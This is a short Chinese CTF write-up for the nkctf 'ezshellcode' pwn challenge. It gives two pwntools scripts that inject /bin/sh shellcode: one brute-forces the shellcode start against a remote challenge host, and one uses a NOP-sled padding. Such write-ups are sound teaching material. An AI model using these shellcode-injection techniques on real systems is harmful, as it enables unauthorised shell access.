---
title: ezshellcode
date: 2023-03-26 22:03:11
categories: 
- pwn_wp
tags: 
- pwn
- shellcode
---

nkctf，一道简单的shellcode题，做的时候是爆破shellcode起始位置的，后面仔细想想可以填充`nop(''\x90’)`。

<!-- more -->

爆破shellcode的起始位置：

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

shellcode=asm(shellcraft.sh())
payload=b'a'*0x8+shellcode*0x3

while(True):
    p=remote('node.yuzhian.com.cn',36519)
    try:      
        p.sendline(payload)
        p.interactive()
        p.sendline('\n')
        break
    except EOFError as e:
        p.close()
        raise e
        continue

```

nop雪橇：

```py
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn'
elf=ELF('./'+filename)
p=process('./'+filename)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

shellcode=asm(shellcraft.sh())
payload=shellcode.rjust(0x100,b'\x90')

# debug()
s(payload)

itr()
```

